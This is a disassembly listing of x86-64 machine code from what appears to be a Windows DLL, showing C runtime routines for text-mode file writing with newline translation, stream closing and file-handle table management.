   18000f512:	ff c3                	inc    %ebx
   18000f514:	49 8b ff             	mov    %r15,%rdi
   18000f517:	41 88 44 0d 4c       	mov    %al,0x4c(%r13,%rcx,1)
   18000f51c:	4b 8b 04 fc          	mov    (%r12,%r15,8),%rax
   18000f520:	41 c7 44 05 50 01 00 	movl   $0x1,0x50(%r13,%rax,1)
   18000f527:	00 00 
   18000f529:	eb 1c                	jmp    0x18000f547
   18000f52b:	ff 15 47 1b 00 00    	call   *0x1b47(%rip)        # 0x180011078
   18000f531:	8b f0                	mov    %eax,%esi
   18000f533:	eb 0d                	jmp    0x18000f542
   18000f535:	ff 15 3d 1b 00 00    	call   *0x1b3d(%rip)        # 0x180011078
   18000f53b:	8b f0                	mov    %eax,%esi
   18000f53d:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f542:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f547:	8b 44 24 40          	mov    0x40(%rsp),%eax
   18000f54b:	85 db                	test   %ebx,%ebx
   18000f54d:	0f 85 c4 03 00 00    	jne    0x18000f917
   18000f553:	33 db                	xor    %ebx,%ebx
   18000f555:	85 f6                	test   %esi,%esi
   18000f557:	0f 84 86 03 00 00    	je     0x18000f8e3
   18000f55d:	83 fe 05             	cmp    $0x5,%esi
   18000f560:	0f 85 6c 03 00 00    	jne    0x18000f8d2
   18000f566:	e8 c5 80 ff ff       	call   0x180007630
   18000f56b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000f571:	e8 4a 80 ff ff       	call   0x1800075c0
   18000f576:	89 30                	mov    %esi,(%rax)
   18000f578:	e9 4d fc ff ff       	jmp    0x18000f1ca
   18000f57d:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f582:	eb 07                	jmp    0x18000f58b
   18000f584:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f589:	33 c0                	xor    %eax,%eax
   18000f58b:	4c 8d 0d ee be 00 00 	lea    0xbeee(%rip),%r9        # 0x18001b480
   18000f592:	49 8b 0c f9          	mov    (%r9,%rdi,8),%rcx
   18000f596:	41 f6 44 0d 08 80    	testb  $0x80,0x8(%r13,%rcx,1)
   18000f59c:	0f 84 e8 02 00 00    	je     0x18000f88a
   18000f5a2:	8b f0                	mov    %eax,%esi
   18000f5a4:	45 84 e4             	test   %r12b,%r12b
   18000f5a7:	0f 85 d8 00 00 00    	jne    0x18000f685
   18000f5ad:	4d 8b e6             	mov    %r14,%r12
   18000f5b0:	45 85 ff             	test   %r15d,%r15d
   18000f5b3:	0f 84 2a 03 00 00    	je     0x18000f8e3
   18000f5b9:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000f5be:	eb 02                	jmp    0x18000f5c2
   18000f5c0:	33 c0                	xor    %eax,%eax
   18000f5c2:	44 8b 6c 24 40       	mov    0x40(%rsp),%r13d
   18000f5c7:	48 8d bd 30 06 00 00 	lea    0x630(%rbp),%rdi
   18000f5ce:	48 8b c8             	mov    %rax,%rcx
   18000f5d1:	41 8b c4             	mov    %r12d,%eax
   18000f5d4:	41 2b c6             	sub    %r14d,%eax
   18000f5d7:	41 3b c7             	cmp    %r15d,%eax
   18000f5da:	73 27                	jae    0x18000f603
   18000f5dc:	41 8a 04 24          	mov    (%r12),%al
   18000f5e0:	49 ff c4             	inc    %r12
   18000f5e3:	3c 0a                	cmp    $0xa,%al
   18000f5e5:	75 0b                	jne    0x18000f5f2
   18000f5e7:	88 17                	mov    %dl,(%rdi)
   18000f5e9:	41 ff c5             	inc    %r13d
   18000f5ec:	48 ff c7             	inc    %rdi
   18000f5ef:	48 ff c1             	inc    %rcx
   18000f5f2:	48 ff c1             	inc    %rcx
   18000f5f5:	88 07                	mov    %al,(%rdi)
   18000f5f7:	48 ff c7             	inc    %rdi
   18000f5fa:	48 81 f9 ff 13 00 00 	cmp    $0x13ff,%rcx
   18000f601:	72 ce                	jb     0x18000f5d1
   18000f603:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   18000f60a:	44 8b c7             	mov    %edi,%r8d
   18000f60d:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   18000f612:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f617:	44 2b c0             	sub    %eax,%r8d
   18000f61a:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f61f:	49 8b 0c c1          	mov    (%r9,%rax,8),%rcx
   18000f623:	33 c0                	xor    %eax,%eax
   18000f625:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000f62a:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   18000f62f:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   18000f636:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f63b:	ff 15 af 1a 00 00    	call   *0x1aaf(%rip)        # 0x1800110f0
   18000f641:	85 c0                	test   %eax,%eax
   18000f643:	0f 84 e2 fe ff ff    	je     0x18000f52b
   18000f649:	03 5c 24 50          	add    0x50(%rsp),%ebx
   18000f64d:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   18000f654:	48 2b f8             	sub    %rax,%rdi
   18000f657:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   18000f65c:	48 3b c7             	cmp    %rdi,%rax
   18000f65f:	0f 8c dd fe ff ff    	jl     0x18000f542
   18000f665:	41 8b c4             	mov    %r12d,%eax
   18000f668:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000f66d:	4c 8d 0d 0c be 00 00 	lea    0xbe0c(%rip),%r9        # 0x18001b480
   18000f674:	41 2b c6             	sub    %r14d,%eax
   18000f677:	41 3b c7             	cmp    %r15d,%eax
   18000f67a:	0f 82 40 ff ff ff    	jb     0x18000f5c0
   18000f680:	e9 bd fe ff ff       	jmp    0x18000f542
   18000f685:	41 80 fc 02          	cmp    $0x2,%r12b
   18000f689:	4d 8b e6             	mov    %r14,%r12
   18000f68c:	0f 85 e0 00 00 00    	jne    0x18000f772
   18000f692:	45 85 ff             	test   %r15d,%r15d
   18000f695:	0f 84 48 02 00 00    	je     0x18000f8e3
   18000f69b:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000f6a0:	eb 02                	jmp    0x18000f6a4
   18000f6a2:	33 c0                	xor    %eax,%eax
   18000f6a4:	44 8b 6c 24 40       	mov    0x40(%rsp),%r13d
   18000f6a9:	48 8d bd 30 06 00 00 	lea    0x630(%rbp),%rdi
   18000f6b0:	48 8b c8             	mov    %rax,%rcx
   18000f6b3:	41 8b c4             	mov    %r12d,%eax
   18000f6b6:	41 2b c6             	sub    %r14d,%eax
   18000f6b9:	41 3b c7             	cmp    %r15d,%eax
   18000f6bc:	73 32                	jae    0x18000f6f0
   18000f6be:	41 0f b7 04 24       	movzwl (%r12),%eax
   18000f6c3:	49 83 c4 02          	add    $0x2,%r12
   18000f6c7:	66 83 f8 0a          	cmp    $0xa,%ax
   18000f6cb:	75 0f                	jne    0x18000f6dc
   18000f6cd:	66 89 17             	mov    %dx,(%rdi)
   18000f6d0:	41 83 c5 02          	add    $0x2,%r13d
   18000f6d4:	48 83 c7 02          	add    $0x2,%rdi
   18000f6d8:	48 83 c1 02          	add    $0x2,%rcx
   18000f6dc:	48 83 c1 02          	add    $0x2,%rcx
   18000f6e0:	66 89 07             	mov    %ax,(%rdi)
   18000f6e3:	48 83 c7 02          	add    $0x2,%rdi
   18000f6e7:	48 81 f9 fe 13 00 00 	cmp    $0x13fe,%rcx
   18000f6ee:	72 c3                	jb     0x18000f6b3
   18000f6f0:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   18000f6f7:	44 8b c7             	mov    %edi,%r8d
   18000f6fa:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   18000f6ff:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f704:	44 2b c0             	sub    %eax,%r8d
   18000f707:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f70c:	49 8b 0c c1          	mov    (%r9,%rax,8),%rcx
   18000f710:	33 c0                	xor    %eax,%eax
   18000f712:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000f717:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   18000f71c:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   18000f723:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f728:	ff 15 c2 19 00 00    	call   *0x19c2(%rip)        # 0x1800110f0
   18000f72e:	85 c0                	test   %eax,%eax
   18000f730:	0f 84 f5 fd ff ff    	je     0x18000f52b
   18000f736:	03 5c 24 50          	add    0x50(%rsp),%ebx
   18000f73a:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   18000f741:	48 2b f8             	sub    %rax,%rdi
   18000f744:	48 63 44 24 50       	movslq 0x50(%rsp),%rax
   18000f749:	48 3b c7             	cmp    %rdi,%rax
   18000f74c:	0f 8c f0 fd ff ff    	jl     0x18000f542
   18000f752:	41 8b c4             	mov    %r12d,%eax
   18000f755:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000f75a:	4c 8d 0d 1f bd 00 00 	lea    0xbd1f(%rip),%r9        # 0x18001b480
   18000f761:	41 2b c6             	sub    %r14d,%eax
   18000f764:	41 3b c7             	cmp    %r15d,%eax
   18000f767:	0f 82 35 ff ff ff    	jb     0x18000f6a2
   18000f76d:	e9 d0 fd ff ff       	jmp    0x18000f542
   18000f772:	45 85 ff             	test   %r15d,%r15d
   18000f775:	0f 84 68 01 00 00    	je     0x18000f8e3
   18000f77b:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   18000f781:	eb 02                	jmp    0x18000f785
   18000f783:	33 c0                	xor    %eax,%eax
   18000f785:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   18000f789:	48 8b d0             	mov    %rax,%rdx
   18000f78c:	41 8b c4             	mov    %r12d,%eax
   18000f78f:	41 2b c6             	sub    %r14d,%eax
   18000f792:	41 3b c7             	cmp    %r15d,%eax
   18000f795:	73 2f                	jae    0x18000f7c6
   18000f797:	41 0f b7 04 24       	movzwl (%r12),%eax
   18000f79c:	49 83 c4 02          	add    $0x2,%r12
   18000f7a0:	66 83 f8 0a          	cmp    $0xa,%ax
   18000f7a4:	75 0c                	jne    0x18000f7b2
   18000f7a6:	66 44 89 01          	mov    %r8w,(%rcx)
   18000f7aa:	48 83 c1 02          	add    $0x2,%rcx
   18000f7ae:	48 83 c2 02          	add    $0x2,%rdx
   18000f7b2:	48 83 c2 02          	add    $0x2,%rdx
   18000f7b6:	66 89 01             	mov    %ax,(%rcx)
   18000f7b9:	48 83 c1 02          	add    $0x2,%rcx
   18000f7bd:	48 81 fa a8 06 00 00 	cmp    $0x6a8,%rdx
   18000f7c4:	72 c6                	jb     0x18000f78c
   18000f7c6:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   18000f7ca:	33 ff                	xor    %edi,%edi
   18000f7cc:	4c 8d 45 80          	lea    -0x80(%rbp),%r8
   18000f7d0:	2b c8                	sub    %eax,%ecx
   18000f7d2:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   18000f7d7:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   18000f7dc:	8b c1                	mov    %ecx,%eax
   18000f7de:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000f7e3:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   18000f7ea:	00 
   18000f7eb:	99                   	cltd
   18000f7ec:	2b c2                	sub    %edx,%eax
   18000f7ee:	33 d2                	xor    %edx,%edx
   18000f7f0:	d1 f8                	sar    $1,%eax
   18000f7f2:	44 8b c8             	mov    %eax,%r9d
   18000f7f5:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   18000f7fc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f801:	ff 15 d9 18 00 00    	call   *0x18d9(%rip)        # 0x1800110e0
   18000f807:	44 8b e8             	mov    %eax,%r13d
   18000f80a:	85 c0                	test   %eax,%eax
   18000f80c:	0f 84 23 fd ff ff    	je     0x18000f535
   18000f812:	48 63 c7             	movslq %edi,%rax
   18000f815:	45 8b c5             	mov    %r13d,%r8d
   18000f818:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   18000f81f:	48 03 d0             	add    %rax,%rdx
   18000f822:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   18000f827:	48 8d 0d 52 bc 00 00 	lea    0xbc52(%rip),%rcx        # 0x18001b480
   18000f82e:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   18000f832:	33 c0                	xor    %eax,%eax
   18000f834:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000f839:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f83e:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   18000f843:	44 2b c7             	sub    %edi,%r8d
   18000f846:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   18000f84a:	ff 15 a0 18 00 00    	call   *0x18a0(%rip)        # 0x1800110f0
   18000f850:	85 c0                	test   %eax,%eax
   18000f852:	74 0b                	je     0x18000f85f
   18000f854:	03 7c 24 50          	add    0x50(%rsp),%edi
   18000f858:	44 3b ef             	cmp    %edi,%r13d
   18000f85b:	7f b5                	jg     0x18000f812
   18000f85d:	eb 08                	jmp    0x18000f867
   18000f85f:	ff 15 13 18 00 00    	call   *0x1813(%rip)        # 0x180011078
   18000f865:	8b f0                	mov    %eax,%esi
   18000f867:	44 3b ef             	cmp    %edi,%r13d
   18000f86a:	0f 8f cd fc ff ff    	jg     0x18000f53d
   18000f870:	41 8b dc             	mov    %r12d,%ebx
   18000f873:	41 b8 0d 00 00 00    	mov    $0xd,%r8d
   18000f879:	41 2b de             	sub    %r14d,%ebx
   18000f87c:	41 3b df             	cmp    %r15d,%ebx
   18000f87f:	0f 82 fe fe ff ff    	jb     0x18000f783
   18000f885:	e9 b3 fc ff ff       	jmp    0x18000f53d
   18000f88a:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   18000f88f:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   18000f894:	45 8b c7             	mov    %r15d,%r8d
   18000f897:	49 8b d6             	mov    %r14,%rdx
   18000f89a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000f89f:	ff 15 4b 18 00 00    	call   *0x184b(%rip)        # 0x1800110f0
   18000f8a5:	85 c0                	test   %eax,%eax
   18000f8a7:	74 0b                	je     0x18000f8b4
   18000f8a9:	8b 5c 24 50          	mov    0x50(%rsp),%ebx
   18000f8ad:	8b c6                	mov    %esi,%eax
   18000f8af:	e9 97 fc ff ff       	jmp    0x18000f54b
   18000f8b4:	ff 15 be 17 00 00    	call   *0x17be(%rip)        # 0x180011078
   18000f8ba:	8b f0                	mov    %eax,%esi
   18000f8bc:	8b c3                	mov    %ebx,%eax
   18000f8be:	e9 88 fc ff ff       	jmp    0x18000f54b
   18000f8c3:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   18000f8c8:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f8cd:	e9 79 fc ff ff       	jmp    0x18000f54b
   18000f8d2:	8b ce                	mov    %esi,%ecx
   18000f8d4:	e8 07 7d ff ff       	call   0x1800075e0
   18000f8d9:	e9 ec f8 ff ff       	jmp    0x18000f1ca
   18000f8de:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   18000f8e3:	48 8d 05 96 bb 00 00 	lea    0xbb96(%rip),%rax        # 0x18001b480
   18000f8ea:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   18000f8ee:	41 f6 44 05 08 40    	testb  $0x40,0x8(%r13,%rax,1)
   18000f8f4:	74 0a                	je     0x18000f900
   18000f8f6:	41 80 3e 1a          	cmpb   $0x1a,(%r14)
   18000f8fa:	0f 84 a6 f8 ff ff    	je     0x18000f1a6
   18000f900:	e8 2b 7d ff ff       	call   0x180007630
   18000f905:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   18000f90b:	e8 b0 7c ff ff       	call   0x1800075c0
   18000f910:	89 18                	mov    %ebx,(%rax)
   18000f912:	e9 b3 f8 ff ff       	jmp    0x18000f1ca
   18000f917:	2b d8                	sub    %eax,%ebx
   18000f919:	8b c3                	mov    %ebx,%eax
   18000f91b:	48 8b 8d 30 1a 00 00 	mov    0x1a30(%rbp),%rcx
   18000f922:	48 33 cc             	xor    %rsp,%rcx
   18000f925:	e8 06 59 ff ff       	call   0x180005230
   18000f92a:	48 8b 9c 24 98 1b 00 	mov    0x1b98(%rsp),%rbx
   18000f931:	00 
   18000f932:	48 81 c4 40 1b 00 00 	add    $0x1b40,%rsp
   18000f939:	41 5f                	pop    %r15
   18000f93b:	41 5e                	pop    %r14
   18000f93d:	41 5d                	pop    %r13
   18000f93f:	41 5c                	pop    %r12
   18000f941:	5f                   	pop    %rdi
   18000f942:	5e                   	pop    %rsi
   18000f943:	5d                   	pop    %rbp
   18000f944:	c3                   	ret
   18000f945:	cc                   	int3
   18000f946:	cc                   	int3
   18000f947:	cc                   	int3
   18000f948:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000f94d:	57                   	push   %rdi
   18000f94e:	48 83 ec 20          	sub    $0x20,%rsp
   18000f952:	83 cf ff             	or     $0xffffffff,%edi
   18000f955:	48 8b d9             	mov    %rcx,%rbx
   18000f958:	48 85 c9             	test   %rcx,%rcx
   18000f95b:	75 14                	jne    0x18000f971
   18000f95d:	e8 ce 7c ff ff       	call   0x180007630
   18000f962:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000f968:	e8 f7 7b ff ff       	call   0x180007564
   18000f96d:	0b c7                	or     %edi,%eax
   18000f96f:	eb 46                	jmp    0x18000f9b7
   18000f971:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   18000f975:	74 3a                	je     0x18000f9b1
   18000f977:	e8 e0 f1 ff ff       	call   0x18000eb5c
   18000f97c:	48 8b cb             	mov    %rbx,%rcx
   18000f97f:	8b f8                	mov    %eax,%edi
   18000f981:	e8 56 06 00 00       	call   0x18000ffdc
   18000f986:	48 8b cb             	mov    %rbx,%rcx
   18000f989:	e8 fa f0 ff ff       	call   0x18000ea88
   18000f98e:	8b c8                	mov    %eax,%ecx
   18000f990:	e8 c7 04 00 00       	call   0x18000fe5c
   18000f995:	85 c0                	test   %eax,%eax
   18000f997:	79 05                	jns    0x18000f99e
   18000f999:	83 cf ff             	or     $0xffffffff,%edi
   18000f99c:	eb 13                	jmp    0x18000f9b1
   18000f99e:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   18000f9a2:	48 85 c9             	test   %rcx,%rcx
   18000f9a5:	74 0a                	je     0x18000f9b1
   18000f9a7:	e8 d4 5b ff ff       	call   0x180005580
   18000f9ac:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   18000f9b1:	83 63 18 00          	andl   $0x0,0x18(%rbx)
   18000f9b5:	8b c7                	mov    %edi,%eax
   18000f9b7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000f9bc:	48 83 c4 20          	add    $0x20,%rsp
   18000f9c0:	5f                   	pop    %rdi
   18000f9c1:	c3                   	ret
   18000f9c2:	cc                   	int3
   18000f9c3:	cc                   	int3
   18000f9c4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000f9c9:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   18000f9ce:	57                   	push   %rdi
   18000f9cf:	48 83 ec 20          	sub    $0x20,%rsp
   18000f9d3:	48 8b d9             	mov    %rcx,%rbx
   18000f9d6:	83 cf ff             	or     $0xffffffff,%edi
   18000f9d9:	33 c0                	xor    %eax,%eax
   18000f9db:	48 85 c9             	test   %rcx,%rcx
   18000f9de:	0f 95 c0             	setne  %al
   18000f9e1:	85 c0                	test   %eax,%eax
   18000f9e3:	75 14                	jne    0x18000f9f9
   18000f9e5:	e8 46 7c ff ff       	call   0x180007630
   18000f9ea:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000f9f0:	e8 6f 7b ff ff       	call   0x180007564
   18000f9f5:	8b c7                	mov    %edi,%eax
   18000f9f7:	eb 26                	jmp    0x18000fa1f
   18000f9f9:	f6 41 18 40          	testb  $0x40,0x18(%rcx)
   18000f9fd:	74 06                	je     0x18000fa05
   18000f9ff:	83 61 18 00          	andl   $0x0,0x18(%rcx)
   18000fa03:	eb f0                	jmp    0x18000f9f5
   18000fa05:	e8 32 ce ff ff       	call   0x18000c83c
   18000fa0a:	90                   	nop
   18000fa0b:	48 8b cb             	mov    %rbx,%rcx
   18000fa0e:	e8 35 ff ff ff       	call   0x18000f948
   18000fa13:	8b f8                	mov    %eax,%edi
   18000fa15:	48 8b cb             	mov    %rbx,%rcx
   18000fa18:	e8 bb ce ff ff       	call   0x18000c8d8
   18000fa1d:	eb d6                	jmp    0x18000f9f5
   18000fa1f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   18000fa24:	48 83 c4 20          	add    $0x20,%rsp
   18000fa28:	5f                   	pop    %rdi
   18000fa29:	c3                   	ret
   18000fa2a:	cc                   	int3
   18000fa2b:	cc                   	int3
   18000fa2c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000fa31:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000fa36:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   18000fa3b:	41 57                	push   %r15
   18000fa3d:	48 83 ec 20          	sub    $0x20,%rsp
   18000fa41:	48 63 c1             	movslq %ecx,%rax
   18000fa44:	48 8b f0             	mov    %rax,%rsi
   18000fa47:	48 c1 fe 05          	sar    $0x5,%rsi
   18000fa4b:	4c 8d 3d 2e ba 00 00 	lea    0xba2e(%rip),%r15        # 0x18001b480
   18000fa52:	83 e0 1f             	and    $0x1f,%eax
   18000fa55:	48 6b d8 58          	imul   $0x58,%rax,%rbx
   18000fa59:	49 8b 3c f7          	mov    (%r15,%rsi,8),%rdi
   18000fa5d:	83 7c 3b 0c 00       	cmpl   $0x0,0xc(%rbx,%rdi,1)
   18000fa62:	75 34                	jne    0x18000fa98
   18000fa64:	b9 0a 00 00 00       	mov    $0xa,%ecx
   18000fa69:	e8 9e b2 ff ff       	call   0x18000ad0c
   18000fa6e:	90                   	nop
   18000fa6f:	83 7c 3b 0c 00       	cmpl   $0x0,0xc(%rbx,%rdi,1)
   18000fa74:	75 18                	jne    0x18000fa8e
   18000fa76:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   18000fa7a:	48 03 cf             	add    %rdi,%rcx
   18000fa7d:	45 33 c0             	xor    %r8d,%r8d
   18000fa80:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   18000fa85:	e8 fe a1 ff ff       	call   0x180009c88
   18000fa8a:	ff 44 3b 0c          	incl   0xc(%rbx,%rdi,1)
   18000fa8e:	b9 0a 00 00 00       	mov    $0xa,%ecx
   18000fa93:	e8 64 b4 ff ff       	call   0x18000aefc
   18000fa98:	49 8b 0c f7          	mov    (%r15,%rsi,8),%rcx
   18000fa9c:	48 83 c1 10          	add    $0x10,%rcx
   18000faa0:	48 03 cb             	add    %rbx,%rcx
   18000faa3:	ff 15 37 17 00 00    	call   *0x1737(%rip)        # 0x1800111e0
   18000faa9:	b8 01 00 00 00       	mov    $0x1,%eax
   18000faae:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000fab3:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000fab8:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   18000fabd:	48 83 c4 20          	add    $0x20,%rsp
   18000fac1:	41 5f                	pop    %r15
   18000fac3:	c3                   	ret
   18000fac4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000fac9:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   18000face:	41 56                	push   %r14
   18000fad0:	48 83 ec 20          	sub    $0x20,%rsp
   18000fad4:	85 c9                	test   %ecx,%ecx
   18000fad6:	78 6f                	js     0x18000fb47
   18000fad8:	3b 0d ca d0 00 00    	cmp    0xd0ca(%rip),%ecx        # 0x18001cba8
   18000fade:	73 67                	jae    0x18000fb47
   18000fae0:	48 63 c1             	movslq %ecx,%rax
   18000fae3:	4c 8d 35 96 b9 00 00 	lea    0xb996(%rip),%r14        # 0x18001b480
   18000faea:	48 8b f8             	mov    %rax,%rdi
   18000faed:	83 e0 1f             	and    $0x1f,%eax
   18000faf0:	48 c1 ff 05          	sar    $0x5,%rdi
   18000faf4:	48 6b d8 58          	imul   $0x58,%rax,%rbx
   18000faf8:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   18000fafc:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   18000fb01:	74 44                	je     0x18000fb47
   18000fb03:	48 83 3c 18 ff       	cmpq   $0xffffffffffffffff,(%rax,%rbx,1)
   18000fb08:	74 3d                	je     0x18000fb47
   18000fb0a:	83 3d ff b2 00 00 01 	cmpl   $0x1,0xb2ff(%rip)        # 0x18001ae10
   18000fb11:	75 27                	jne    0x18000fb3a
   18000fb13:	85 c9                	test   %ecx,%ecx
   18000fb15:	74 16                	je     0x18000fb2d
   18000fb17:	ff c9                	dec    %ecx
   18000fb19:	74 0b                	je     0x18000fb26
   18000fb1b:	ff c9                	dec    %ecx
   18000fb1d:	75 1b                	jne    0x18000fb3a
   18000fb1f:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   18000fb24:	eb 0c                	jmp    0x18000fb32
   18000fb26:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000fb2b:	eb 05                	jmp    0x18000fb32
   18000fb2d:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   18000fb32:	33 d2                	xor    %edx,%edx
   18000fb34:	ff 15 fe 16 00 00    	call   *0x16fe(%rip)        # 0x180011238
   18000fb3a:	49 8b 04 fe          	mov    (%r14,%rdi,8),%rax
   18000fb3e:	48 83 0c 03 ff       	orq    $0xffffffffffffffff,(%rbx,%rax,1)
   18000fb43:	33 c0                	xor    %eax,%eax
   18000fb45:	eb 16                	jmp    0x18000fb5d
   18000fb47:	e8 e4 7a ff ff       	call   0x180007630
   18000fb4c:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fb52:	e8 69 7a ff ff       	call   0x1800075c0
   18000fb57:	83 20 00             	andl   $0x0,(%rax)
   18000fb5a:	83 c8 ff             	or     $0xffffffff,%eax
   18000fb5d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000fb62:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   18000fb67:	48 83 c4 20          	add    $0x20,%rsp
   18000fb6b:	41 5e                	pop    %r14
   18000fb6d:	c3                   	ret
   18000fb6e:	cc                   	int3
   18000fb6f:	cc                   	int3
   18000fb70:	48 83 ec 28          	sub    $0x28,%rsp
   18000fb74:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000fb77:	75 15                	jne    0x18000fb8e
   18000fb79:	e8 42 7a ff ff       	call   0x1800075c0
   18000fb7e:	83 20 00             	andl   $0x0,(%rax)
   18000fb81:	e8 aa 7a ff ff       	call   0x180007630
   18000fb86:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fb8c:	eb 4d                	jmp    0x18000fbdb
   18000fb8e:	85 c9                	test   %ecx,%ecx
   18000fb90:	78 31                	js     0x18000fbc3
   18000fb92:	3b 0d 10 d0 00 00    	cmp    0xd010(%rip),%ecx        # 0x18001cba8
   18000fb98:	73 29                	jae    0x18000fbc3
   18000fb9a:	48 63 c9             	movslq %ecx,%rcx
   18000fb9d:	4c 8d 05 dc b8 00 00 	lea    0xb8dc(%rip),%r8        # 0x18001b480
   18000fba4:	48 8b c1             	mov    %rcx,%rax
   18000fba7:	83 e1 1f             	and    $0x1f,%ecx
   18000fbaa:	48 c1 f8 05          	sar    $0x5,%rax
   18000fbae:	48 6b d1 58          	imul   $0x58,%rcx,%rdx
   18000fbb2:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000fbb6:	f6 44 10 08 01       	testb  $0x1,0x8(%rax,%rdx,1)
   18000fbbb:	74 06                	je     0x18000fbc3
   18000fbbd:	48 8b 04 10          	mov    (%rax,%rdx,1),%rax
   18000fbc1:	eb 1c                	jmp    0x18000fbdf
   18000fbc3:	e8 f8 79 ff ff       	call   0x1800075c0
   18000fbc8:	83 20 00             	andl   $0x0,(%rax)
   18000fbcb:	e8 60 7a ff ff       	call   0x180007630
   18000fbd0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000fbd6:	e8 89 79 ff ff       	call   0x180007564
   18000fbdb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   18000fbdf:	48 83 c4 28          	add    $0x28,%rsp
   18000fbe3:	c3                   	ret
   18000fbe4:	48 63 d1             	movslq %ecx,%rdx
   18000fbe7:	4c 8d 05 92 b8 00 00 	lea    0xb892(%rip),%r8        # 0x18001b480
   18000fbee:	48 8b c2             	mov    %rdx,%rax
   18000fbf1:	83 e2 1f             	and    $0x1f,%edx
   18000fbf4:	48 c1 f8 05          	sar    $0x5,%rax
   18000fbf8:	48 6b ca 58          	imul   $0x58,%rdx,%rcx
   18000fbfc:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   18000fc00:	48 83 c1 10          	add    $0x10,%rcx
   18000fc04:	48 03 c8             	add    %rax,%rcx
   18000fc07:	48 ff 25 da 15 00 00 	rex.W jmp *0x15da(%rip)        # 0x1800111e8
   18000fc0e:	cc                   	int3
   18000fc0f:	cc                   	int3
   18000fc10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
